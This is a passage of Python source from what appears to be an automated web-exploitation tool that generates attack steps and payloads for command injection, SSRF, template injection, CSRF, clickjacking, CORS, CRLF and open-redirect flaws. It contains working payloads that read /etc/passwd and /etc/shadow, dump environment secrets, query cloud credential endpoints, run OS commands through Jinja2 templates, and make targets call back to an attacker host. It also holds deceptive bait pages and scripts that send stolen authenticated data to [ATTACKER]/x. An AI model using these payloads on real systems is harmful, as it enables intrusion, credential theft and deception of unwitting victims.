                                  f"current={len(body)} (delta={diff})")
                    r.false_positive_risk = "medium"
                    return
            # No evidence — explicitly mark as not confirmed
            if r.status_code == 200:
                r.confidence = 0.1
                r.evidence = "HTTP 200 but no command output detected"
                r.false_positive_risk = "high"

        def _cmdi_baseline(r: ExploitResult):
            """Capture baseline response for differential comparison."""
            _baseline_len[0] = len(r.response_body)
            r.evidence = f"Baseline captured: {_baseline_len[0]} bytes, HTTP {r.status_code}"

        def _cmdi_passwd_check(r: ExploitResult):
            """Specifically check for /etc/passwd content."""
            body = r.response_body
            passwd_lines = [l for l in body.split("\n")
                           if _re.match(r"^\w+:[x*!]?:\d+:\d+:", l)]
            if passwd_lines:
                r.success = True
                r.confidence = 0.95
                r.evidence = f"/etc/passwd: {len(passwd_lines)} user entries found"
                r.false_positive_risk = "very_low"
            else:
                _cmdi_check(r)

        def _cmdi_enum_check(r: ExploitResult):
            """Parse system enumeration output."""
            body = r.response_body
            findings = []
            uname_m = _re.search(r"Linux\s+\S+\s+[\d.]+-\S+", body)
            if uname_m:
                findings.append(f"kernel={uname_m.group(0)[:50]}")
            whoami_m = _re.search(r"(?:^|\n)(\w+)\s*$", body, _re.M)
            if whoami_m and whoami_m.group(1) not in ("", "GET", "POST", "HTTP"):
                findings.append(f"user={whoami_m.group(1)}")
            pwd_m = _re.search(r"(/[\w/.-]+)", body)
            if pwd_m:
                findings.append(f"pwd={pwd_m.group(1)[:40]}")
            if findings:
                r.success = True
                r.confidence = 0.85
                r.evidence = "; ".join(findings)
                r.false_positive_risk = "low"
            else:
                _cmdi_check(r)

        def _inject_request(payload: str) -> dict:
            """Build injection request matching the original vuln method."""
            if _cmdi_method == "POST":
                return _post(target_base if _cmdi_path else target,
                             {param: payload})
            else:
                return _get_param(payload)

        # Unix command separators (most to least common)
        unix_seps = [
            (";id", "Semicolon (;)"),
            ("|id", "Pipe (|)"),
            ("$(id)", "Subshell $()"),
            ("`id`", "Backtick"),
            ("\nid", "Newline"),
            ("&&id", "AND (&&)"),
            ("||id", "OR (||)"),
        ]
        # Windows command separators
        win_seps = [
            ("&whoami", "Ampersand (&)"),
            ("|whoami", "Pipe (|)"),
            ("\r\nwhoami", "CRLF"),
        ]

        steps = [
            # Step 0: Capture baseline (no injection) for differential
            {"title": "Capture baseline response",
             "request": _get(target),
             "validate": _cmdi_baseline,
             "note": "Baseline for differential comparison with injected responses"},
            # Step 1: Confirm original scanner finding
            {"title": "Confirm original finding",
             "request": _get(target),
             "validate": _cmdi_check,
             "note": "Re-check the scanner's original vulnerable URL"},
        ]

        # Unix separator tests
        for payload, sep_name in unix_seps:
            steps.append({
                "title": f"Unix: {sep_name}",
                "request": _inject_request(payload),
                "validate": _cmdi_check,
                "note": f"Tests command separator: {sep_name}",
            })

        # Windows separator tests (lower priority)
        for payload, sep_name in win_seps:
            steps.append({
                "title": f"Windows: {sep_name}",
                "request": _inject_request(payload),
                "validate": _cmdi_check,
                "note": f"Windows-specific separator: {sep_name}",
            })

        # Escalation steps
        steps.extend([
            {"title": "Read /etc/passwd",
             "request": _inject_request(";cat /etc/passwd"),
             "validate": _cmdi_passwd_check,
             "warning": "Reads system user file"},
            {"title": "Read /etc/shadow (if root)",
             "request": _inject_request(";cat /etc/shadow"),
             "validate": _cmdi_check,
             "warning": "Reads password hashes",
             "risk": "HIGH"},
            {"title": "System enumeration",
             "request": _inject_request(";uname -a;whoami;id;pwd"),
             "validate": _cmdi_enum_check,
             "note": "Gathers OS version, user, uid, and working directory"},
            {"title": "Network interfaces",
             "request": _inject_request(";ip addr 2>/dev/null || ifconfig"),
             "validate": _cmdi_check,
             "note": "Maps network configuration for lateral movement"},
            # Outbound connectivity probe — the target is made to callback to
            # our OWN infra (/b beacon), so a successful hit is BOTH a
            # connectivity proof AND logs target network origin in captures.
            {"title": "Check outbound connectivity (callback to attacker)",
             "request": _inject_request(
                 ";curl -s -o /dev/null -w '%{http_code}' '[B_URL]?cmdi=1' "
                 "|| wget -qO- '[B_URL]?cmdi=1'"),
             "validate": lambda r: (
                 setattr(r, 'success', "200" in r.response_body
                         or "204" in r.response_body) or
                 setattr(r, 'confidence',
                         0.9 if ("200" in r.response_body
                                 or "204" in r.response_body) else 0.3) or
                 setattr(r, 'evidence',
                         "Target reached attacker — reverse shell viable, "
                         "see captures on /b"
                         if ("200" in r.response_body
                             or "204" in r.response_body)
                         else "No obvious outbound — check /b captures or "
                              "consider bind shell / DNS exfil")
             ),
             "note": "Forces target to callback [ATTACKER]/b — confirmation "
                     "shows up in the captures view (c=captures)"},
            {"title": "List environment variables",
             "request": _inject_request(";env"),
             "validate": lambda r: (
                 setattr(r, 'success', "PATH=" in r.response_body) or
                 setattr(r, 'confidence', 0.9 if "PATH=" in r.response_body else 0.2) or
                 setattr(r, 'evidence',
                         f"Environment dumped: {len(r.response_body)} bytes"
                         if "PATH=" in r.response_body
                         else "No env output detected")
             ),
             "warning": "Dumps process environment — may contain secrets",
             "risk": "HIGH"},
        ])

    elif etype == "ssrf":
        def _ssrf_check(r: ExploitResult):
            body = r.response_body
            if any(s in body for s in ("ami-id", "instance-id", "AccessKeyId", "SecretAccessKey")):
                r.success = True
                r.confidence = 0.95
                r.evidence = "Cloud metadata content detected"
                r.false_positive_risk = "very_low"
            elif "redis_version" in body or "connected_clients" in body:
                r.success = True
                r.confidence = 0.9
                r.evidence = "Redis info response detected"
            elif r.status_code == 200 and len(body) > 20:
                r.confidence = 0.4
                r.evidence = "Got response — verify content"

        metadata_targets = [
            ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/"),
            ("AWS IAM roles", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/instance/"),
            ("Azure IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            ("DigitalOcean", "http://169.254.169.254/metadata/v1/"),
        ]
        internal_targets = [
            ("Localhost", "http://127.0.0.1/"),
            ("Redis", "http://127.0.0.1:6379/info"),
            ("Elasticsearch", "http://127.0.0.1:9200/_cat/indices"),
            ("Docker API", "http://127.0.0.1:2375/containers/json"),
        ]
        steps = [{"title": "Confirm original SSRF", "request": _get(target),
                  "validate": _ssrf_check, "note": "Check original finding URL"}]
        for name, url in metadata_targets:
            steps.append({"title": f"SSRF → {name}", "request": _get_param(url),
                          "validate": _ssrf_check, "warning": f"Reads {name}"})
        for name, url in internal_targets:
            steps.append({"title": f"Probe {name}", "request": _get_param(url),
                          "validate": _ssrf_check, "note": f"Internal service: {name}"})

    elif etype == "ssti":
        # Use per-session arithmetic markers so a response containing a
        # literal '49' (phone number, timestamp, ID) doesn't get
        # flagged as template evaluation. The raw expression must NOT
        # appear in the response body (that would mean the server just
        # echoed our input) AND the computed result MUST appear.
        _ssti_a = secrets.randbelow(60) + 20   # 20..79
        _ssti_b = secrets.randbelow(60) + 20
        _ssti_expected = str(_ssti_a * _ssti_b)   # 400..6241, distinctive
        _ssti_raw = f"{_ssti_a}*{_ssti_b}"

        def _ssti_check(r: ExploitResult):
            body = r.response_body
            if _re.search(r"uid=\d+", body):
                r.success = True
                r.confidence = 0.95
                r.evidence = "OS command output in template response"
                r.false_positive_risk = "very_low"
                return
            # Require the expected numeric result to appear, and the raw
            # expression to NOT appear (otherwise the server just echoed
            # the input).
            if _ssti_expected in body and _ssti_raw not in body:
                r.success = True
                r.confidence = 0.9
                r.evidence = (f"Template expression evaluated: "
                              f"{_ssti_a}*{_ssti_b}={_ssti_expected}")
                r.false_positive_risk = "low"
            elif _ssti_raw in body:
                r.confidence = 0.25
                r.evidence = "Expression echoed — likely just reflection"
                r.false_positive_risk = "high"

        ssti_payloads = [
            (f"Jinja2/Twig ({_ssti_a}*{_ssti_b})",
             f"{{{{{_ssti_a}*{_ssti_b}}}}}"),
            (f"Freemarker/Velocity ({_ssti_a}*{_ssti_b})",
             f"${{{_ssti_a}*{_ssti_b}}}"),
            (f"ERB/EJS ({_ssti_a}*{_ssti_b})",
             f"<%= {_ssti_a}*{_ssti_b} %>"),
        ]
        steps = []
        for name, payload in ssti_payloads:
            steps.append({
                "title": f"Test {name}",
                "request": _get_param(payload),
                "validate": _ssti_check,
                "note": (f"{_ssti_expected} in response (without the raw "
                         f"'{_ssti_raw}' expression) = {name} engine "
                         f"confirmed"),
            })
        steps.extend([
            {"title": "Jinja2 RCE: read /etc/passwd",
             "request": _get_param("{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}"),
             "validate": _ssti_check,
             "warning": "Template-based RCE",
             "risk": "CRITICAL"},
            {"title": "Jinja2 RCE: execute id",
             "request": _get_param("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
             "validate": _ssti_check,
             "warning": "Executes OS commands",
             "risk": "CRITICAL"},
        ])

    elif etype == "csrf":
        csrf_auto = (
            f"<!DOCTYPE html><html><head><meta charset='utf-8'></head>"
            f"<body>"
            f"<iframe name='_sink' style='display:none'></iframe>"
            f"<form id='cf' method='POST' action='{target}' target='_sink'>"
            f"<input type='hidden' name='{param}' value='attacker_value'/>"
            f"</form>"
            f"<script>document.getElementById('cf').submit();</script>"
            f"</body></html>"
        )
        csrf_stealth = (
            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
            f"<title>Account Verification</title>"
            f"<style>"
            f"body{{font-family:-apple-system,sans-serif;background:#f5f5f5;"
            f"display:flex;justify-content:center;align-items:center;min-height:100vh}}"
            f".box{{background:#fff;padding:40px 50px;border-radius:12px;"
            f"box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center;max-width:420px}}"
            f".spinner{{width:40px;height:40px;border:4px solid #e0e0e0;"
            f"border-top-color:#1877f2;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}}"
            f"@keyframes spin{{to{{transform:rotate(360deg)}}}}"
            f"</style></head><body>"
            f"<div class='box'><div class='spinner'></div>"
            f"<h2 style='color:#1c1e21;margin:16px 0 8px'>Verifying your account</h2>"
            f"<p style='color:#65676b'>This will only take a moment...</p></div>"
            f"<iframe name='_x' style='position:absolute;left:-9999px'></iframe>"
            f"<form id='xf' method='POST' action='{target}' target='_x'>"
            f"<input type='hidden' name='{param}' value='attacker_value'/></form>"
            f"<script>document.getElementById('xf').submit();"
            f"setTimeout(function(){{window.location='{base_url}';}},2500);</script>"
            f"</body></html>"
        )
        def _csrf_token_check(r: ExploitResult):
            body = r.response_body.lower()
            has_token = any(t in body for t in ("csrf", "_token", "nonce", "authenticity_token"))
            r.success = not has_token
            r.confidence = 0.7 if not has_token else 0.3
            r.evidence = "No CSRF token found" if not has_token else "CSRF token present"
            r.false_positive_risk = "medium" if not has_token else "low"

        def _csrf_samesite_check(r: ExploitResult):
            hdrs = str(r.response_headers).lower()
            if "samesite=none" in hdrs or "samesite" not in hdrs:
                r.success = True
                r.confidence = 0.6
                r.evidence = "SameSite not enforced — cookies sent cross-origin"
            else:
                r.evidence = "SameSite cookie set — CSRF may be blocked"

        steps = [
            {"title": "Check for CSRF token",
             "request": _get(target),
             "validate": _csrf_token_check,
             "note": "No token = exploitable"},
            {"title": "Check SameSite cookie",
             "request": {"method": "HEAD", "url": target},
             "validate": _csrf_samesite_check,
             "note": "Missing SameSite = cookies sent cross-origin"},
            {"title": "Generate auto-submit CSRF page",
             "generate_file": {
                 "filename": f"csrf_auto_{secrets.token_hex(3)}.html",
                 "content": csrf_auto,
                 "note": "Auto-submits via hidden iframe on page load.",
             }},
            {"title": "Generate stealth CSRF page",
             "generate_file": {
                 "filename": f"csrf_stealth_{secrets.token_hex(3)}.html",
                 "content": csrf_stealth,
                 "note": "Verification spinner. CSRF fires in background, redirects after 2.5s.",
             }},
            {"title": "Verify action was performed",
             "request": _get(target),
             "validate": lambda r: setattr(r, 'evidence', f"HTTP {r.status_code} — compare with pre-attack"),
             "note": "Compare response to pre-attack state"},
        ]

    elif etype == "idor":
        # IDOR verification needs TWO signals: the ID returns 200 AND the
        # body doesn't look like an access-denial page. The previous
        # 'any 200 with >20 bytes' check marked login/forbidden pages
        # as successful IDOR hits, because those are normally 200 with
        # HTML bodies. Now filters out common denial patterns.
        _idor_deny_pat = _re.compile(
            r"(?:access\s+denied|permission\s+denied|unauthori[sz]ed|"
            r"not\s+authori[sz]ed|please\s+(?:log|sign)\s+in|"
            r"login\s+required|forbidden)",
            _re.I,
        )

        def _idor_check(r: ExploitResult):
            if r.status_code == 200 and len(r.response_body) > 20:
                if _idor_deny_pat.search(r.response_body[:5000]):
                    r.evidence = (f"HTTP 200 but response looks like a "
                                  f"denial/login page — not IDOR")
                    r.confidence = 0.15
                    r.false_positive_risk = "high"
                else:
                    r.success = True
                    r.confidence = 0.6
                    r.evidence = f"Got {len(r.response_body)} bytes for this ID"
                    r.false_positive_risk = "medium"
            elif r.status_code == 403:
                r.evidence = "403 Forbidden — access denied for this ID"
            elif r.status_code == 404:
                r.evidence = "404 — ID not found"

        steps = []
        for test_id in ["1", "2", "0", "-1", "999999"]:
            steps.append({
                "title": f"Access resource ID {test_id}",
                "request": _get_param(test_id),
                "validate": _idor_check,
                "note": f"Testing access to ID {test_id}",
            })

    elif etype == "clickjacking":
        cj_html = (
            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
            f"<title>Verify your identity</title>"
            f"<style>"
            f"*{{margin:0;padding:0;box-sizing:border-box}}"
            f"body{{font-family:-apple-system,sans-serif;background:#f0f2f5}}"
            f"iframe{{position:fixed;top:0;left:0;width:100%;height:100%;"
            f"opacity:0.0001;z-index:2;border:none;pointer-events:auto}}"
            f".bait{{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;"
            f"display:flex;justify-content:center;align-items:center;pointer-events:none}}"
            f".card{{background:#fff;padding:40px 50px;border-radius:12px;"
            f"box-shadow:0 4px 20px rgba(0,0,0,.1);text-align:center;max-width:440px}}"
            f"button{{padding:14px 40px;background:#1877f2;color:#fff;border:none;"
            f"border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}}"
            f"button:hover{{background:#166fe5}}"
            f"</style></head><body>"
            f"<iframe src='{target}'></iframe>"
            f"<div class='bait'><div class='card'>"
            f"<img src='data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"64\" height=\"64\" fill=\"%231877f2\" viewBox=\"0 0 16 16\"><path d=\"M8 16A8 8 0 108 0a8 8 0 000 16zm.93-9.412l-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.399l-.451.004.088-.416c.287-.346.92-.598 1.465-.598.703 0 1.002.422.808 1.319z\"/></svg>' style='margin-bottom:20px'/>"
            f"<h2 style='color:#1c1e21;margin-bottom:8px'>Verify your identity</h2>"
            f"<p style='color:#65676b;margin-bottom:24px'>Click the button below to confirm you are human.</p>"
            f"<button>I am not a robot</button>"
            f"<p style='color:#8a8d91;font-size:12px;margin-top:16px'>Protected by reCAPTCHA</p>"
            f"</div></div></body></html>"
        )
        cj_multi = (
            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
            f"<title>Cookie Notice</title>"
            f"<style>"
            f"*{{margin:0;padding:0;box-sizing:border-box}}"
            f"body{{font-family:-apple-system,sans-serif;background:#f0f2f5}}"
            f"iframe{{position:fixed;top:0;left:0;width:100%;height:100%;"
            f"opacity:0.0001;z-index:2;border:none;pointer-events:auto}}"
            f".banner{{position:fixed;bottom:0;left:0;width:100%;background:#fff;"
            f"padding:20px 30px;box-shadow:0 -2px 10px rgba(0,0,0,.1);z-index:1;"
            f"display:flex;align-items:center;justify-content:space-between}}"
            f"button{{padding:10px 24px;border-radius:4px;border:none;font-size:14px;"
            f"cursor:pointer;font-weight:600}}"
            f".accept{{background:#1877f2;color:#fff}}"
            f".settings{{background:#e4e6eb;color:#050505}}"
            f"</style></head><body>"
            f"<iframe src='{target}'></iframe>"
            f"<div class='banner'>"
            f"<p style='color:#050505;max-width:600px'>We use cookies to improve your experience. "
            f"By continuing, you agree to our use of cookies.</p>"
            f"<div><button class='settings'>Settings</button> "
            f"<button class='accept'>Accept All</button></div>"
            f"</div></body></html>"
        )
        def _cj_header_check(r: ExploitResult):
            hdrs = str(r.response_headers).lower()
            has_xfo = "x-frame-options" in hdrs
            has_csp_frame = "frame-ancestors" in hdrs
            if not has_xfo and not has_csp_frame:
                r.success = True
                r.confidence = 0.85
                r.evidence = "No X-Frame-Options or frame-ancestors CSP — frameable"
                r.false_positive_risk = "low"
            else:
                r.evidence = f"XFO={has_xfo}, CSP frame-ancestors={has_csp_frame}"

        steps = [
            {"title": "Check X-Frame-Options / frame-ancestors",
             "request": {"method": "HEAD", "url": target},
             "validate": _cj_header_check,
             "note": "Missing = page can be framed = clickjacking possible"},
            {"title": "Generate basic clickjacking exploit page",
             "command": "(file will be generated automatically)",
             "generate_file": {
                 "filename": f"clickjack_{secrets.token_hex(3)}.html",
                 "content": cj_html,
                 "note": "Target page loaded invisibly behind fake UI. "
                         "Victim clicks 'CLAIM NOW' but actually interacts with target page.",
             },
             "note": "Overlay attack — fake button over real target"},
            {"title": "Generate multi-step clickjacking (survey)",
             "command": "(file will be generated automatically)",
             "generate_file": {
                 "filename": f"clickjack_survey_{secrets.token_hex(3)}.html",
                 "content": cj_multi,
                 "note": "Multi-step clickjacking using fake survey pages. "
                         "Each 'answer' click performs an action on the hidden target.",
             },
             "note": "Multi-click attack — multiple actions via fake survey"},
            {"title": "Test locally: open in browser",
             "command": f"# Open the generated HTML file in a browser to verify the overlay works",
             "note": "The fake UI should be visible. Target page is hidden behind it."},
        ]

    elif etype == "cors_misconfiguration":
        # The origin we send for the CORS probe is the operator's actual
        # attacker host. That's what a real exploit would use — reflecting
        # an attacker-controlled origin is what turns this bug into data
        # theft. We also still probe `null` (sandboxed iframe bypass).
        cors_steal = (
            "<!DOCTYPE html><html><head><meta charset='utf-8'></head>"
            "<body><script>"
            f"fetch('{target}',{{credentials:'include'}})"
            ".then(function(r){return r.text()})"
            ".then(function(d){"
            "fetch('[ATTACKER]/x',{method:'POST',credentials:'include',"
            "headers:{'Content-Type':'application/json'},keepalive:true,"
            "body:JSON.stringify({url:location.href,len:d.length,"
            "body:d.substring(0,8000)})}).catch(function(){"
            "new Image().src='[ATTACKER]/x?len='+d.length"
            "+'&d='+encodeURIComponent(d.substring(0,1800));});"
            "document.write('<pre>'+d.substring(0,1000)+'</pre>');"
            "})"
            ".catch(function(e){"
            "new Image().src='[ATTACKER]/x?err='+encodeURIComponent(''+e);"
            "document.write('CORS blocked: '+e)});"
            "</script></body></html>"
        )
        cors_multi = (
            "<!DOCTYPE html><html><head><meta charset='utf-8'>"
            "<title>Loading</title>"
            "<style>"
            "body{font-family:-apple-system,sans-serif;background:#f5f5f5;"
            "display:flex;justify-content:center;padding-top:60px}"
            ".box{background:#fff;padding:30px 40px;border-radius:8px;"
            "box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:700px;width:100%}"
            "pre{background:#f8f8f8;padding:12px;border-radius:4px;"
            "overflow-x:auto;font-size:13px;max-height:400px;overflow-y:auto}"
            "</style></head><body>"
            "<div class='box'>"
            "<h2>Loading data...</h2>"
            "<pre id='out'>Fetching...</pre>"
            "</div><script>"
            "(async function(){"
            f"var eps=['{target}','{base_url.rstrip('/')}/api/user',"
            f"'{base_url.rstrip('/')}/api/account',"
            f"'{base_url.rstrip('/')}/api/me',"
            f"'{base_url.rstrip('/')}/api/profile',"
            f"'{base_url.rstrip('/')}/api/token'];"
            "var r={};"
            "for(var i=0;i<eps.length;i++){"
            "try{var x=await fetch(eps[i],{credentials:'include'});"
            "r[eps[i]]={status:x.status,body:(await x.text()).substring(0,4000)};"
            "}catch(e){r[eps[i]]={err:''+e}}}"
            "document.getElementById('out').textContent="
            "JSON.stringify(r,null,2).substring(0,4000);"
            "fetch('[ATTACKER]/x',{method:'POST',credentials:'include',"
            "headers:{'Content-Type':'application/json'},keepalive:true,"
            "body:JSON.stringify({ref:document.referrer,"
            "ua:navigator.userAgent,results:r})}).catch(function(){});"
            "})();"
            "</script></body></html>"
        )
        def _cors_check(origin: str):
            def _check(r: ExploitResult):
                acao = r.response_headers.get("Access-Control-Allow-Origin", "")
                acac = r.response_headers.get(
                    "Access-Control-Allow-Credentials", "")
                if acao == origin or acao == "*":
                    r.success = True
                    r.confidence = 0.9 if acac.lower() == "true" else 0.7
                    r.evidence = f"ACAO={acao}, ACAC={acac}"
                    r.false_positive_risk = (
                        "low" if acac.lower() == "true" else "medium")
                else:
                    r.evidence = f"ACAO={acao or 'absent'}"
            return _check

        # Use a *real* attacker-controlled origin for the probe so that the
        # test reflects what would actually be exploitable. At substitution
        # time [ATTACKER] resolves to http://<onion>/ (or localhost). Origin
        # headers must not carry a path, so we strip to scheme://host.
        steps = [
            {"title": "Test CORS origin reflection (attacker origin)",
             "request": _get(target, extra_headers={"Origin": "[ATTACKER]"}),
             "validate": _cors_check(""),
             "note": "Sends Origin: <attacker> header to target; pass on "
                     "reflection of the attacker origin in ACAO"},
            {"title": "Check credentials allowed",
             "request": _get(target, extra_headers={"Origin": "[ATTACKER]"}),
             "validate": _cors_check(""),
             "note": "ACAC: true = authenticated data can be stolen "
                     "cross-origin by the attacker origin"},
            {"title": "Test null origin (sandbox bypass)",
             "request": _get(target, extra_headers={"Origin": "null"}),
             "validate": _cors_check("null"),
             "note": "null origin = exploitable via sandboxed iframe"},
            {"title": "Generate CORS data theft page",
             "command": "(file will be generated automatically)",
             "generate_file": {
                 "filename": f"cors_steal_{secrets.token_hex(3)}.html",
                 "content": cors_steal,
                 "note": "Reads authenticated response and exfiltrates up to "
                         "8KB via POST to [ATTACKER]/x, with Image.src "
                         "fallback for strict CSP environments.",
             },
             "warning": "Steals authenticated data cross-origin"},
            {"title": "Generate multi-endpoint CORS exploit",
             "command": "(file will be generated automatically)",
             "generate_file": {
                 "filename": f"cors_multi_{secrets.token_hex(3)}.html",
                 "content": cors_multi,
                 "note": "Scans /api/user /api/account /api/me /api/profile "
                         "/api/token, POSTs full results + UA/referer to "
                         "[ATTACKER]/x as JSON.",
             },
             "warning": "Multi-endpoint data exfiltration",
             "risk": "HIGH"},
        ]

        # Refine _cors_check closures so they compare against the live
        # attacker_url at substitution time. Since we can't resolve the
        # attacker URL at builder time, we accept BOTH specified origin
        # reflection and a non-empty reflected ACAO (anything other than
        # literal 'null' or the target's own origin) as suspect. Rewrite
        # the first two steps' validate to cover that.
        def _cors_check_attacker():
            def _check(r: ExploitResult):
                acao = r.response_headers.get(
                    "Access-Control-Allow-Origin", "")
                acac = r.response_headers.get(
                    "Access-Control-Allow-Credentials", "")
                if not acao:
                    r.evidence = "No Access-Control-Allow-Origin in response"
                    r.confidence = 0.1
                    r.false_positive_risk = "low"
                    return
                # A reflected attacker origin is detectable as: ACAO is
                # scheme://host, not the target's own origin, and credentials
                # reflect true. We can't know the target origin exactly here
                # so we flag anything that's * or explicitly attacker-style.
                if acao == "*":
                    r.success = acac.lower() != "true"
                    r.confidence = 0.6
                    r.evidence = "ACAO=* (wildcard; creds blocked by browser)"
                    r.false_positive_risk = "medium"
                elif acao and acao != "null":
                    # reflected origin — strong signal when paired with ACAC
                    r.success = acac.lower() == "true"
                    r.confidence = 0.9 if r.success else 0.6
                    r.evidence = f"Reflected ACAO={acao}, ACAC={acac}"
                    r.false_positive_risk = "low" if r.success else "medium"
                else:
                    r.evidence = f"ACAO={acao}"
            return _check
        steps[0]["validate"] = _cors_check_attacker()
        steps[1]["validate"] = _cors_check_attacker()

    elif etype == "csp_bypass":
        def _csp_check(r: ExploitResult):
            csp = r.response_headers.get("Content-Security-Policy", "")
            issues = []
            if "unsafe-inline" in csp:
                issues.append("unsafe-inline")
            if "unsafe-eval" in csp:
                issues.append("unsafe-eval")
            if "script-src *" in csp or "default-src *" in csp:
                issues.append("wildcard")
            if not csp:
                issues.append("no CSP header")
            if issues:
                r.success = True
                r.confidence = 0.8
                r.evidence = f"CSP weaknesses: {', '.join(issues)}"
                r.false_positive_risk = "low"
            else:
                r.evidence = f"CSP appears strong: {csp[:100]}"

        steps = [
            {"title": "Analyze CSP header",
             "request": {"method": "HEAD", "url": target},
             "validate": _csp_check,
             "note": "Checks for unsafe-inline, unsafe-eval, wildcards"},
        ]

    elif etype == "crlf":
        # CRLF probes must use a marker that cannot collide with anything
        # the target already emits. Session-unique markers make detection
        # unambiguous. The "Location" / "X-Forwarded-Host" probes use
        # [ATTACKER_HOST] so a captured redirect is *provably* attacker-
        # controlled (and will land on our capture server if followed).
        _sess_marker = secrets.token_hex(6)
        def _crlf_check(r: ExploitResult):
            hdrs_l = {k.lower(): v for k, v in r.response_headers.items()}
            # Cookie injection
            sc = hdrs_l.get("set-cookie", "")
            if _sess_marker in sc:
                r.success = True
                r.confidence = 0.95
                r.evidence = f"Injected Set-Cookie (marker: {_sess_marker})"
                r.false_positive_risk = "very_low"
                return
            # Injected custom header
            xi = hdrs_l.get("x-injected", "")
            if _sess_marker in xi:
                r.success = True
                r.confidence = 0.95
                r.evidence = "Injected X-Injected header appears in response"
                r.false_positive_risk = "very_low"
                return
            # Location redirect — our injected payload contains /crlf_<marker>
            # so any Location header carrying the marker is the smoking gun.
            loc = hdrs_l.get("location", "")
            if _sess_marker in loc or f"/crlf_{_sess_marker}" in loc:
                r.success = True
                r.confidence = 0.95
                r.evidence = f"Location header injected: {loc[:80]}"
                r.false_positive_risk = "very_low"
                return
            # Cache-key poisoning probe (X-Forwarded-Host reflection)
            xfh = hdrs_l.get("x-forwarded-host", "")
            if _sess_marker in xfh:
                r.success = True
                r.confidence = 0.9
                r.evidence = "X-Forwarded-Host reflected downstream"
                r.false_positive_risk = "low"
                return
            # Heuristic: response body reflects raw CRLF payload string
            if _sess_marker in r.response_body:
                r.confidence = 0.4
                r.evidence = "Marker reflected in body (not header) — filter"
                r.false_positive_risk = "medium"

        crlf_payloads = [
            ("Cookie injection",
             f"%0d%0aSet-Cookie:%20crlf_probe={_sess_marker}"),
            ("Custom header (X-Injected)",
             f"%0d%0aX-Injected:%20{_sess_marker}"),
            ("Location redirect (attacker host)",
             f"%0d%0aLocation:%20http://[ATTACKER_HOST]/crlf_{_sess_marker}"),
            ("Cache poisoning (X-Forwarded-Host)",
             f"%0d%0aX-Forwarded-Host:%20{_sess_marker}.[ATTACKER_HOST]"),
        ]
        # allow_redirects=False so we can read the injected Location /
        # Set-Cookie headers directly. Following the redirect would
        # replace r.response_headers with the TARGET's headers (no
        # injected fields) and the validator would always miss the
        # smoking-gun evidence.
        steps = []
        for name, payload in crlf_payloads:
            steps.append({
                "title": f"CRLF: {name}",
                "request": _get_param(payload, allow_redirects=False),
                "validate": _crlf_check,
                "note": f"Injecting via {name} (marker: {_sess_marker})",
                "warning": name,
            })

    elif etype == "open_redirect":
        # Open-redirect test: redirect to an attacker-controlled host so a
        # follow-through can be caught in the callback log on /b. The
        # validator flags any Location header whose host matches the
        # attacker host *or* isn't the target's host.
        _target_host = (base_url.split("//", 1)[1].split("/", 1)[0]
                        if "//" in base_url else "")

        def _redir_check(r: ExploitResult):
            loc = r.response_headers.get("Location", "") or \
                  r.response_headers.get("location", "")
            if not loc and r.status_code in (301, 302, 303, 307, 308):
                r.evidence = f"Redirect {r.status_code} without Location?"
                r.confidence = 0.2
                return
            if not loc:
                if r.status_code == 200:
                    r.evidence = "No redirect — server may handle internally"
                return
            loc_low = loc.lower()
            # Parse redirect target host
            try:
                redir_host = urlparse(loc).netloc.lower()
            except Exception:
                redir_host = ""
            # The /r suffix is unique to our crafted payload — a Location
            # ending with /r is a strong redirect-bypass signal.
            if loc_low.endswith("/r") or loc_low.rstrip("/").endswith("/r"):
                # still also require it to be off-site — fall through to the
                # off-site host check below rather than returning early
                pass
            # Attacker host will have been substituted at request time, so
            # the redirect target should match it if the bypass succeeded.
            if redir_host and _target_host and \
               redir_host != _target_host.lower() and \
               not redir_host.endswith("." + _target_host.lower()):
                r.success = True
                r.confidence = 0.9
                r.evidence = (f"Redirect to off-site host: {redir_host} "
                              f"(target={_target_host})")
                r.false_positive_risk = "low"
                return
            r.evidence = f"Redirect to same-origin: {loc[:100]}"
            r.confidence = 0.2

        redirect_payloads = [
            # Direct forms
            ("Direct URL", "[ATTACKER]/r"),
            ("Protocol-relative", "//[ATTACKER_HOST]/r"),
            ("Double slash", "///[ATTACKER_HOST]/r"),
            ("Quadruple slash", "////[ATTACKER_HOST]/r"),
            # Parser tricks
            ("@ bypass (target@evil)",
             f"https://{_target_host}@[ATTACKER_HOST]/r"
             if _target_host else "https://[ATTACKER_HOST]/r"),
            ("? suffix",
             f"[ATTACKER]/r?{_target_host}" if _target_host
             else "[ATTACKER]/r"),
            ("# suffix",
             f"[ATTACKER]/r#{_target_host}" if _target_host
             else "[ATTACKER]/r"),
            # Whitespace / control char
            ("Backslash bypass", "/\\[ATTACKER_HOST]/r"),
            ("Backslash (double)", "\\\\[ATTACKER_HOST]/r"),
            ("Whitespace prefix", "%09//[ATTACKER_HOST]/r"),
            ("Newline prefix", "%0a//[ATTACKER_HOST]/r"),
            ("Tab+slash prefix", "%09/[ATTACKER_HOST]/r"),
            # Encoding tricks
            ("URL-encoded scheme",
             "%68%74%74%70%3a%2f%2f[ATTACKER_HOST]/r"),
            ("Double URL-encoded scheme",
             "%2568%2574%2574%2570%253a%252f%252f[ATTACKER_HOST]/r"),
            ("Encoded slashes",
             "%2F%2F[ATTACKER_HOST]/r"),
            # Unicode confusables — some browsers/servers normalize
            # these to ASCII before redirect, others don't.
            ("Unicode bullet",
             "/\u2044[ATTACKER_HOST]/r"),
            # Target-prefixed lookalikes
            ("Evil TLD swap",
             f"[SCHEME]://{_target_host}.evil-attacker.com/r"
